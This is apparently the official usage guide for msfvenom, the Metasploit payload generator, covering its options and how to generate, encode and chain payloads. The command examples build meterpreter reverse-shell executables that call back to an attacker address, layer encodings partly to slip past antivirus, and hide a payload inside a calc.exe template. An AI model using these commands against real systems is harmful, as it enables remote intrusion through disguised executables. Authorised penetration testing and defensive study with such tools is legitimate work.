Msfvenom is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8th 2015.

To start using msfvenom, first please take a look at the options it supports:

```
Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
```

# How to generate a payload

To generate a payload, there are two flags that you must supply (-p and -f):

* **The -p flag: Specifies what payload to generate**

To see what payloads are available from Framework, you can do:

```
./msfvenom -l payloads
```

The -p flag also supports "-" as a way to accept a custom payload:

```
cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
```

* **The -f flag: Specifies the format of the payload**

Syntax example:

```
./msfvenom -p windows/meterpreter/bind_tcp -f exe
```

To see what formats are supported, you can do the following to find out:

```
./msfvenom --help-formats
```

Typically, this is probably how you will use msfvenom:

```
$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
```


# How to encode a payload

By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:

```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
```

To find out what encoders you can use, you can use the -l flag:

```
./msfvenom -l encoders
```

You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn't really meant to be used a real AV evasion solution:

```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
```

# How to avoid bad characters

The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:

```
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
```

# How to supply a custom template

By default, msfvenom uses templates from the msf/data/templates directory. If you'd like to choose your own, you can use the -x flag like the following:

```
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
```

Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:

```
./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
```

The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.

# How to chain msfvenom output

The old ``msfpayload`` and ``msfencode`` utilities were often chained together in order layer on multiple encodings. This is possible using ``msfvenom`` as well:

```
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```
